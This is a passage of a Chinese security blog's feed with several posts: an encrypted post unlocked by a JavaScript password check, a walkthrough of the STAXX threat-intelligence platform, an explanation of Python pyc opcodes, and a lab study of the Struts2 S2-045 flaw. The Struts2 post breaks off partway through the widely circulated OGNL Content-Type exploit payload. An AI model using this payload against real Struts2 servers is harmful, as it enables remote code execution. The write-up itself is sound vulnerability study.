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&quot;
      var string = prompt(&#39;请输入文章密码&#39;);
      if (string == null){
        location=&quot;http://phantom0301.cc&quot;;
      }
      if (hex_md5(string) == &quot;73c9778213e388e1e0bdf2b2ed210f94&quot;){
          alert(&#39;密码正确！&#39;);
          txt  = CryptoJS.AES.decrypt(cyber, string).toString(CryptoJS.enc.Utf8);
            }
      else
       {
         alert(&quot;密码错误&quot;);
         location=&quot;http://phantom0301.cc&quot;;
      }
      document.write(txt);
&lt;/script&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;这是一篇加密的博文~~&lt;br&gt;
    
    </summary>
    
      <category term="审计" scheme="http://phantom0301.cc/categories/%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="FANGFACMS" scheme="http://phantom0301.cc/tags/FANGFACMS/"/>
    
      <category term="PHP命令执行" scheme="http://phantom0301.cc/tags/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="SQL注入" scheme="http://phantom0301.cc/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ANOMALI STAXX威胁情报订阅分析系统把玩</title>
    <link href="http://phantom0301.cc/2017/03/27/staxx/"/>
    <id>http://phantom0301.cc/2017/03/27/staxx/</id>
    <published>2017-03-27T12:35:24.000Z</published>
    <updated>2017-03-27T13:27:09.144Z</updated>
    
    <content type="html">&lt;p&gt;ANOMALI公司就是以前的ThreatStream，以前我研究过的MHN就是出自他手，其实本来是在找MHN的一些资料的，结果无意中看见了它家的威胁情报订阅系统STAXX，就把玩了一下。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-威胁情报标准&quot;&gt;&lt;a href=&quot;#0x01-威胁情报标准&quot; class=&quot;headerlink&quot; title=&quot;0x01 威胁情报标准&quot;&gt;&lt;/a&gt;0x01 威胁情报标准&lt;/h2&gt;&lt;p&gt;大名鼎鼎的STIX、CybOX和TAXII，网上有很多资料，懒的找的话可以邮件向我索取一些我之前收集的相关资料，当然，如果我不犯懒的话，会回应邮件的。：）&lt;/p&gt;
&lt;h2 id=&quot;0x02-STAXX配置&quot;&gt;&lt;a href=&quot;#0x02-STAXX配置&quot; class=&quot;headerlink&quot; title=&quot;0x02 STAXX配置&quot;&gt;&lt;/a&gt;0x02 STAXX配置&lt;/h2&gt;&lt;p&gt;既然是把玩，就不一板一眼的翻译官档了。&lt;/p&gt;
&lt;p&gt;从ANOMALI的官网上可以直接下到STAXX的虚拟机文件，双击直接安装完成。开启机器后在页面上显示主机账号密码以及URL。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327204644.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;浏览器登录系统后，使用页面上提示的账号密码进入WEB端，一路配置到第三步&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327194728.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里官档提供了一个免费的feed server，我有找了一个一起提供给大家。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://hailataxii.com/taxii-discovery-service&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://hailataxii.com/taxii-discovery-service&lt;/a&gt; guest/guest&lt;br&gt;    &lt;a href=&quot;https://intelfeed.malwerewolf.com/taxii-discovery-service&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://intelfeed.malwerewolf.com/taxii-discovery-service&lt;/a&gt; guest/guest&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你有更多的feed server也希望能够喵我，让我也能订阅到更多的信息。&lt;/p&gt;
&lt;p&gt;订阅成功后，就到第5步，这里选择需要订阅的具体条目，以及订阅刷新时间，ident等配置信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327195025.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;订阅好后，记得去配置（右上角齿轮一样的图标）里刷新一下，过一会儿，就可以在面板里查看pull到的信息了。&lt;/p&gt;
&lt;h2 id=&quot;0x03-DASHBOARD&quot;&gt;&lt;a href=&quot;#0x03-DASHBOARD&quot; class=&quot;headerlink&quot; title=&quot;0x03 DASHBOARD&quot;&gt;&lt;/a&gt;0x03 DASHBOARD&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327205415.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上面五颜六色的就是订阅到的信息，左起第一幅图是不同时间段提供的指示器信息，有包括钓鱼网站URL、apt URL、恶意邮件、洋葱ip、cc等等信息，我们点击一个apt URL来看一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327205736.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;点击相应的URL就可以进入到ANOMALI网站下查看详细信息。&lt;/p&gt;
&lt;p&gt;左起第二幅图是一个安全态势的查看，可以查阅当前情报不同危险等级的数量。&lt;/p&gt;
&lt;p&gt;第二列第一幅图是信息来源的统计，紧接着是标签统计和可信度的分析。&lt;/p&gt;
&lt;h2 id=&quot;0x04-ACTIVITY-amp-IMPORT&quot;&gt;&lt;a href=&quot;#0x04-ACTIVITY-amp-IMPORT&quot; class=&quot;headerlink&quot; title=&quot;0x04 ACTIVITY &amp;amp; IMPORT&quot;&gt;&lt;/a&gt;0x04 ACTIVITY &amp;amp; IMPORT&lt;/h2&gt;&lt;p&gt;这个版面提供动态查看情报的功能，并且支持数据导出，如果你有自己的feed收集器，也可以通过这里把自己的威胁情报信息push给其他的服务器使用。&lt;/p&gt;
&lt;p&gt;另外在IMPORT可以自定义导入TXT文本做解析，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327210956.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;不过它这里的文本匹配规则很迷，你可以随意喂给它一个TXT文本看看就知道了。&lt;/p&gt;
&lt;h2 id=&quot;0x05-小结&quot;&gt;&lt;a href=&quot;#0x05-小结&quot; class=&quot;headerlink&quot; title=&quot;0x05 ## 小结&quot;&gt;&lt;/a&gt;0x05 ## 小结&lt;/h2&gt;&lt;p&gt;作为开源软件，STAXX还是有它的亮点，提供简便的威胁情报标准订阅，以及简洁的图表分析。不过，这种功能暂时看来又有些鸡肋，从公共威胁情报来说，开放的feed不是太多，从私有威胁情报来说，部署一整套完整的威胁收集到分析系统性价比又值得商榷。而且，对于普通的公司来说，每天分析这么多来自于全世界的威胁信息恐怕也不现实吧~~&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;ANOMALI公司就是以前的ThreatStream，以前我研究过的MHN就是出自他手，其实本来是在找MHN的一些资料的，结果无意中看见了它家的威胁情报订阅系统STAXX，就把玩了一下。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="威胁情报，taxii" scheme="http://phantom0301.cc/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%8Ctaxii/"/>
    
  </entry>
  
  <entry>
    <title>Python与它的opcode</title>
    <link href="http://phantom0301.cc/2017/03/24/pythonopcode/"/>
    <id>http://phantom0301.cc/2017/03/24/pythonopcode/</id>
    <published>2017-03-24T07:26:29.000Z</published>
    <updated>2017-03-27T13:36:27.122Z</updated>
    
    <content type="html">&lt;p&gt;0CTF中有一道opcode修改的题，当时觉得除了暴力尝试还原外没有什么更好的思路，结果后来看到了别人的write up，还真是暴力尝试~~&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-PyCodeObject&quot;&gt;&lt;a href=&quot;#0x01-PyCodeObject&quot; class=&quot;headerlink&quot; title=&quot;0x01 PyCodeObject&quot;&gt;&lt;/a&gt;0x01 PyCodeObject&lt;/h2&gt;&lt;p&gt;Python代码在运行时，将我们写的源码转换成字节码，再由python解释器来执行字节码。而字节码就是一个PyCodeObject对象。一个相应的对象如下：文件在/include/code.h&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Bytecode object */
typedef struct {
    PyObject_HEAD
    int co_argcount;        /* #arguments, except *args */
    int co_nlocals;        /* #local variables */
    int co_stacksize;        /* #entries needed for evaluation stack */
    int co_flags;        /* CO_..., see below */
    PyObject *co_code;        /* 编译所得的字节码指令序列 */
    PyObject *co_consts;    /* Block中所有常量的元组 */
    PyObject *co_names;        /* 所有名字的元组 */
    PyObject *co_varnames;    /* 在本代码段中赋值，但没有被内层代码引用的变量*/
    PyObject *co_freevars;    /* 在本层引用，在外层赋值的变量*/
    PyObject *co_cellvars;      /* 本层赋值，且被内层代码段引用的变量*/
    /* The rest doesn&amp;apos;t count for hash/cmp */
    PyObject *co_filename;    /* python文件路径*/
    PyObject *co_name;        /* 函数名或类名*/
    int co_firstlineno;        /* Block所在的起始行*/
    PyObject *co_lnotab;    /* 字节码指令与pyc文件中的source code对应关系*/
    void *co_zombieframe;     /* 优化(see frameobject.c) */
    PyObject *co_weakreflist;   /* to support weakrefs to code objects */
} PyCodeObject;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从这个定义中，我们可以简单了解一下，该对象有哪些参数组成：&lt;/p&gt;
&lt;p&gt;1 co_argcount，一个Code Block的参数计数。&lt;/p&gt;
&lt;p&gt;作为萌新，这里再多提一下python中的几种参数形式,python中的参数形式可以分成位置参数和关键字参数两类，位置参数即参数所在的位置影响它被处理的逻辑，关键字参数即参数所在的位置与它的处理逻辑无关。&lt;/p&gt;
&lt;p&gt;另一个概念是，Code Block，这个概念是说我们所写的Python代码中的每一个名字空间在编译时都会对应一个Code Block，每一个Block会创建一个PyCodeObject对象&lt;/p&gt;
&lt;p&gt;那么这样的话，我们就可以理解这个参数做了什么，我们写一段代码来做个测试，看这样一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def co_arg(fn):
    print fn.__name__,fn.__code__.co_argcount
@co_arg
def f1():
    pass
@co_arg
def f2(a):
    pass
@co_arg
def f3(a,b):
    pass
@co_arg
def f4(a,b=1):
    pass
@co_arg
def f5(a,b,*c):
    pass
@co_arg
def f6(a,b,*c,**d):
    pass
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;f1 0
&amp;gt;&amp;gt;f2 1
&amp;gt;&amp;gt;f3 2
&amp;gt;&amp;gt;f4 2
&amp;gt;&amp;gt;f5 2
&amp;gt;&amp;gt;f6 2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;OK，我们可以看到这个变量记录了函数的参数个数，但不记录tuple参数和dict参数&lt;/p&gt;
&lt;p&gt;2 co_nlocals，一个Code Bloack的局部变量计数，包括所有参数和局部变量。&lt;/p&gt;
&lt;p&gt;同样看如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def co_nlo(fn):
    print fn.__name__,fn.__code__.co_nlocals
@co_nlo
def f1():
    pass
@co_nlo
def f2(a):
    pass
@co_nlo
def f3(a):
    b=1
@co_nlo
def f4(a,*b,**c):
    d=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;f1 0
&amp;gt;&amp;gt;f2 1
&amp;gt;&amp;gt;f3 2
&amp;gt;&amp;gt;f4 4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 co_stacksize,运行这段Code Block需要的栈空间&lt;/p&gt;
&lt;p&gt;剩下的解释就直接标注在上面的type结构中。&lt;/p&gt;
&lt;p&gt;了解过PyCodeObject后，我们就可以来看看pyc，一般情况下，翻译的字节码会写入内存中，当程序结束后，会根据程序运行的方式来决定是否将字节码写入pyc或者其他格式的存储文件中。&lt;/p&gt;
&lt;p&gt;我们来看一下一个简单的pyc文件。&lt;/p&gt;
&lt;h2 id=&quot;0x02-pyc&quot;&gt;&lt;a href=&quot;#0x02-pyc&quot; class=&quot;headerlink&quot; title=&quot;0x02 pyc&quot;&gt;&lt;/a&gt;0x02 pyc&lt;/h2&gt;&lt;p&gt;我们编译如下代码到pyc来进行学习：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def foo():
    print 1
if __name__ == &amp;apos;__main__&amp;apos;:
    foo()
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;python -m py_compile hello.py&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;编译后的代码如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170324171322.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;看上述pyc图，头4个字节，&lt;em&gt;03f3 0d0a&lt;/em&gt; 是pyc的MAGIC数，用来表示python的版本。接下来的4个字节是时间。头声明完后的是一个Block的开头，即为63，后面的4个字节是PyObject中的argument数，这里为0，接着4个字节是nlocals，这里还是0。接着是4个字节的栈空间&lt;em&gt;，0200 0000&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;接着4个字节的flags &lt;em&gt;4000 0000&lt;/em&gt;。flag后面就是一些具体到代码的字节码。&lt;/p&gt;
&lt;p&gt;开始是co_code，0x73，代表类型s（string），接下来的4个字节代表长度  2300 0000&lt;br&gt;使用小端模式，表示有35个字节长度。&lt;/p&gt;
&lt;p&gt;接下来我们向后取35个字节长度，这时的字节码就可以对应上opcode，都2个字节对应相应opcode操作，如果操作后带有值，那么就在紧跟其后的4个字节中表示。&lt;/p&gt;
&lt;p&gt;完整的版本如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;03f3 0d0a 版本
76e2 d458 时间
63  block
0000 0000 argument
0000 0000 nlocals
0200 0000 栈空间
4000 0000 flags
73 类型 string
2300 0000 长度 35 bytes
64 00 00 LOAD_CONST  0
84 00 00 MAKE_FUNCTION 0
5a 00 00 STORE_NAME 0
65 01 00 LOAD_NAME 1
64 01 00 LOAD_CONST 1
6b 02 00 COMPARE_OP 2
72 1f 00 POP_JUMP_IF_FALSE
65 00 00 LOAD_NAME 0
83 00 00 CALL_FUNCTION 0
01 POP_TOP
6e 00 00 JUMP_FORWARD 0
64 02 00 LOAD_CONST 2
53 RETURN_VALUE

28 (
0300 0000 

63 
0000 0000
0000 0000
0100 0000
4300 0000
73 
0900 0000 
64 01 00
47
48
64 00 00 
53

28 (
0200 0000 
4e N
69 0100 0000 1

28 (
0000 0000
28 (
0000 0000 
28 (
0000 0000
28 (
0000 0000 

73 string  co_filename
3000 0000
屏蔽敏感信息

74 t co_name
0300 0000 
666f6f  foo

0100 0000
73 
0200 0000 
00 01 
74
0800 0000
5f5f 6d61 696e 5f5f

4e N
28
0200 0000
52 R
0000 0000 
74
0800 0000
5f 5f6e 616d 655f5f

28 0000 0000 
28 0000 0000
28 0000 0000

73  co_filename
30 0000 00
屏蔽敏感信息

74  co_name
0800 0000 
3c6d 6f64 756c 653e &amp;lt;module&amp;gt;

0100 0000 

73
0400 0000
0903 0c01 lnotab
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下，第一个block其实可以看成是main主程序的执行，第二个block就是foo函数中执行print的逻辑。&lt;/p&gt;
&lt;p&gt;看这两张图，在对比我上面的字节码，应该就能懂了。&lt;/p&gt;
&lt;p&gt;block 1&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170324204233.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;block 2&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170324204343.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而opcode对应的操作，可以查看python目录下的opcode.py&lt;/p&gt;
&lt;h2 id=&quot;0x03-一道0ctf题&quot;&gt;&lt;a href=&quot;#0x03-一道0ctf题&quot; class=&quot;headerlink&quot; title=&quot;0x03 一道0ctf题&quot;&gt;&lt;/a&gt;0x03 一道0ctf题&lt;/h2&gt;&lt;p&gt;在明白了上述原理后，可以参考这篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://0x48.pw/2017/03/20/0x2f/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://0x48.pw/2017/03/20/0x2f/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;0CTF中有一道opcode修改的题，当时觉得除了暴力尝试还原外没有什么更好的思路，结果后来看到了别人的write up，还真是暴力尝试~~&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://phantom0301.cc/categories/python/"/>
    
    
      <category term="opcode" scheme="http://phantom0301.cc/tags/opcode/"/>
    
      <category term="python" scheme="http://phantom0301.cc/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S2-045漏洞学习及其他</title>
    <link href="http://phantom0301.cc/2017/03/13/struts2/"/>
    <id>http://phantom0301.cc/2017/03/13/struts2/</id>
    <published>2017-03-13T11:30:45.000Z</published>
    <updated>2017-03-23T08:30:19.524Z</updated>
    
    <content type="html">&lt;p&gt;Struts2的环境有时候显得有些庞大而复杂，这里借着漏洞学习的过程了解一下Tomcat+Struts2架构的一些问题，这么一看重要的学习其他而不是漏洞了~~。&lt;/p&gt;
&lt;p&gt;修改：2017.3.23&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-Java-Tomcat-Struts2&quot;&gt;&lt;a href=&quot;#0x01-Java-Tomcat-Struts2&quot; class=&quot;headerlink&quot; title=&quot;0x01 Java+Tomcat+Struts2&quot;&gt;&lt;/a&gt;0x01 Java+Tomcat+Struts2&lt;/h2&gt;&lt;p&gt;之前很少接触Java环境下的Web问题，对于Jboss，Tomcat，Struts2，Weblogic等等的概念没有一下清晰的认识，通过查阅资料，有了如下的认识。&lt;/p&gt;
&lt;p&gt;首先这些应用都是为了完成一个Java的Web服务，那么，在拥有Java环境的情况下，我们需要一个能够监听Web服务并且调度相关逻辑的服务器，这个就是Tomcat起到的作用。&lt;/p&gt;
&lt;p&gt;和Tomcat具有同样身份作用的还有Jboss，Resin，Glassfish和Weblogic，那么其实Struts2都可以部署在这些Java容器中，这里就以Tomcat为例，一个运行成功的Tomcat应用如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170313200921.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们可以看一下默认的Tomcat目录&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bin  # 启动/关闭服务的脚本
 |-bootstrap.jar  # 引导程序
 |-commons-daemon.jar  # 守护程序
 |-tomcat-juli.jar  # java util logging 日志管理
 |-daemon.sh
 |-startup.sh
 |-shutdown.sh
 |-setclasspath.sh  # 动态设置JAVA变量,内部使用
 |-digest.sh  #  使用特殊的算法加密
 |-tool-wrapper.sh  # 封装工具，内部使用
 |-version.sh  #  检测版本
 |-configtest.sh  # 测试配置文件语法
 |-catalina.sh  #  启动相应的java程序
 |-catalina-tasks.xml  # 加载包路径
conf
 |-Catalina  # 默认似乎是空的，可以用来配置项目路径
 |-catalina.properties  # catalina的安全设置、类加载设置、字符缓存设置
 |-catalina.policy  # 安全策略
 |-jaspic-providers.xml  # 身份验证模块配置
 |-jaspic-providers.xsd  # 似乎xsd在这里是变量定义 
 |-logging.properties  # 日志记录配置
 |-tomcat-users.xml  
 |-web.xml  # Web基础配置
 |-context.xml  # 配置策略的路径
 |-server.xml  # 服务端信息配置，端口，日志存储方式，根路径等等    
lib
 |-*.jar  # java封装库
logs
 |-*.log  # 日志存储文件
temp
webapps
 |-*.war  # 打包的Web程序
 |-*  # 自动解压的Web 页面程序
work
 |-*  # 对应webapps的类库
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;*安全策略，包括对于一些系统变量的读取限制，特殊的函数执行限制，文件的读写控制&lt;/p&gt;
&lt;p&gt;下图是一张Tomcat的层级关系&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170313211929.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;简单认识了一下Tomcat的结构后，我们来部署一个含有S054漏洞的struts2应用，下载struts2后，拷贝apps中的structs2-blank.war到Tomcat的webapps目录下，重启Tomcat，就会自动解压war包。&lt;/p&gt;
&lt;p&gt;访问 &lt;a href=&quot;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&lt;/a&gt;&lt;br&gt;就可以访问到一个struts自带的欢迎界面&lt;/p&gt;
&lt;p&gt;我们尝试修改解压出来的应用文件夹名为ROOT，发现在没有任何配置的情况下，tomcat会默认访问ROOT文件夹，而其他文件夹可以通过路由访问，当然前提是策略允许访问，&lt;/p&gt;
&lt;p&gt;同时，我在之前提到了路径还可以配置在conf中，我们尝试创建一个指定根路径为structs2-blank的配置文件于conf/Catalina/localhost中也可以实现当Web文件不在webapps中时的路由访问。&lt;/p&gt;
&lt;p&gt;再来看一下struts默认的目录结构&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docs  # 文档
apps  # struts2的war包，提供样例参考
 |-blank
 |-mailreader
 |-portlet
 |-rest-showcase
 |-showcase
lib  # jar包库
src  # struts2的源码
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们使用blank来做测试用，blank基本展示了struts2应用应该有的几部分：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WEB-INF
|-web.xml  # 过滤器配置文件以及基础路径配置
|-src  # 源码
|-lib  # jar库
|-jsp  # jsp文件夹
|-classes  # 类和其他配置文件文件夹
META-INF  # 元信息
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x02-漏洞测试&quot;&gt;&lt;a href=&quot;#0x02-漏洞测试&quot; class=&quot;headerlink&quot; title=&quot;0x02 漏洞测试&quot;&gt;&lt;/a&gt;0x02 漏洞测试&lt;/h2&gt;&lt;p&gt;这里就直接使用struts2自带的欢迎页面来测试：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先利用网上流传的工具来进行测试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170314140943.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;确实存在漏洞，这个时候我们抓包进行细节的复现。在GET包中增加Content-Type字段，使用网上流传的Payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%{
(#nike=&amp;apos;multipart/form-data&amp;apos;).
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;apos;com.opensymphony.xwork2.ActionContext.container&amp;apos;]).
(#ognlUtil=#container.getInstance
